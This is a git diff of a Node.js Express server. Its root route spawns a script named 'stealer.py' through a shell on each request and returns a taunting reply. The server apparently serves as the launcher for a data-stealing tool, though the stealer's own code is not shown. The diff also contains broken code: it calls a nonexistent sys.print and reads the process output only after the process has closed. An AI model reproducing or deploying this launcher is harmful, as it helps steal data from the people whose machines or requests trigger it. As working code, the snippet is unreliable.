@@ -6,7 +6,6 @@ const express = require('express')
 var cors = require('cors');
 const app = express()
 const spawn = require("child_process").spawn;
-const execSync = require("child_process").execSync;
 
 app.use(cors());
 
@@ -16,17 +15,18 @@ app.listen(port, hostname, () => {
 });
 
 
-app.get('/', (req, res) => {
+app.get('/', async(req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
 
   let dummy = spawn("python ./stealer.py", { shell: true });
-  let dummy2 = execSync("python ./stealer.py", { shell: true });
-
-  dummy2.stdout.on('data', function(data) {
+  await new Promise( (resolve) => {
+    dummy.on('close', resolve)
+})
+  dummy.stdout.on('data', function(data) {
     sys.print(data.toString());
   });
   res.send({uo:"pillado huron"})
   console.log("amicu");
-  console.log(dummy2)
+  console.log(dummy)
 })
 
